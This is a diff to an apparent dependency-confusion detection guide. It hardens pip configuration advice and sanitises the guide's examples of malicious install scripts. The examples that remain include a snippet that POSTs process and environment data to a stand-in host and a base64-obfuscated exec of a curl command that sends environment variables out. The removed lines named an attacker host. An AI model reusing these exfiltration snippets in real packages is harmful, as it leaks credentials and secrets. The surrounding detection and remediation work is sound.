@@ -98,14 +98,27 @@ Verify registry resolution order. **Insecure patterns** allow public registry pr
 //npm.yourorg.com/:_authToken=${NPM_TOKEN}
 ```
 
-**PyPI** (pip.conf) — secure configuration:
+**PyPI** (pip.conf) — SECURE configuration (single index with hash pinning):
 ```ini
 [global]
-index-url = https://pypi.yourorg.com/simple  # Private FIRST
-extra-index-url = https://pypi.org/simple    # Public fallback
+# ONLY use private index that proxies upstream PyPI
+index-url = https://pypi.yourorg.com/simple
+
+# NEVER use extra-index-url - creates dependency confusion vulnerability
+# pip checks ALL indexes and selects highest version across all sources
+# This allows public packages to override private ones
+
+# Require hash verification for all packages
+require-hashes = true
 ```
 
-**Critical**: pip installs the **first package found** with highest version across all indexes.
+**CRITICAL WARNING**: Using `extra-index-url` is **unsafe** and creates the exact 
+vulnerability this skill detects. pip's own documentation states: "Using the 
+--extra-index-url option to search for packages which are not in the main repository 
+is unsafe. This is a class of security issue known as dependency confusion."
+
+**Correct approach**: Configure your private PyPI server (Artifactory, Nexus) to 
+proxy public PyPI. All packages come through a single index-url.
 
 **Maven** (pom.xml) — private repository first:
 ```xml
@@ -167,7 +180,7 @@ const data = JSON.stringify({
   cwd: process.cwd()
 });
 
-https.request('https://attacker-c2.com/collect', {
+https.request('https://example.com/collect', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'}
 }, () => {}).write(data);
@@ -179,7 +192,8 @@ https.request('https://attacker-c2.com/collect', {
 const {exec} = require('child_process');
 const b64 = "Y3VybCAtWCBQT1NUIC1kICQoZW52IHwgYmFzZTY0KQ==";
 exec(Buffer.from(b64, 'base64').toString());
-// Decoded: curl -X POST -d $(env | base64) https://oob.moika.tech
+// Decoded: curl -X POST -d $(env | base64)
+// Note: Full payload includes C2 URL omitted from base64 for brevity
 ```
 
 **Detection approach**:
@@ -347,7 +361,7 @@ severity: HIGH
 
 ### Scenario: CI Pipeline Installing Malicious Package
 
-**Context**: After Artifactory migration, `company-utils` from public npm (not private) exfiltrated CI credentials via postinstall script to `oob.moika.tech`.
+**Context**: After Artifactory migration, `company-utils` from public npm (not private) exfiltrated CI credentials via postinstall script to external C2 server.
 
 **Response**:
 1. Revoke AWS credentials, rotate CI secrets, audit CloudTrail
@@ -382,7 +396,7 @@ PRIVATE PACKAGE INVENTORY
 PUBLIC COLLISIONS DETECTED
 ━━━━━━━━━━━━━━━━━━━━━━━━
 1. 🚨 CRITICAL: company-auth (npm 1.2.3, published 2026-07-10)
-   - Install Scripts: YES (postinstall → network call to 185.220.101.42)
+   - Install Scripts: YES (postinstall → network call to 198.51.100.42)
    - Action: Migrate to @yourcorp/auth IMMEDIATELY
 
 2. ⚠️ HIGH: internal-utils (PyPI 0.9.1, published 2026-06-20)
@@ -395,7 +409,7 @@ CONFIGURATION AUDIT
 - frontend-web (.npmrc): ✅ SECURE - Scoped to private
 
 MALICIOUS PACKAGE ANALYSIS
-company-auth@1.2.3 → Exfiltrates env vars to 185.220.101.42
+company-auth@1.2.3 → Exfiltrates env vars to 198.51.100.42
 
 REMEDIATION ROADMAP
 Priority 1 (0-48h): Rotate credentials, remove collisions, deploy scoping
@@ -407,7 +421,9 @@ Priority 3 (1 month): SBOM audit, SLSA Build Level 2, quarterly audits
 
 - [ ] All internal packages migrated to scoped names (@orgname/package)
 - [ ] .npmrc contains scoped registry configuration with authentication
-- [ ] pip.conf prioritizes private index-url before extra-index-url
+- [ ] pip.conf uses ONLY index-url pointing to private registry (NO extra-index-url)
+- [ ] Private PyPI server configured to proxy upstream PyPI
+- [ ] Hash pinning (--require-hashes) enabled for pip
 - [ ] Maven settings.xml uses mirror or explicit repository order
 - [ ] CI/CD pipelines inject package registry credentials securely (not hardcoded)
 - [ ] Socket.dev or equivalent SCA tool deployed with --bail-on-threat
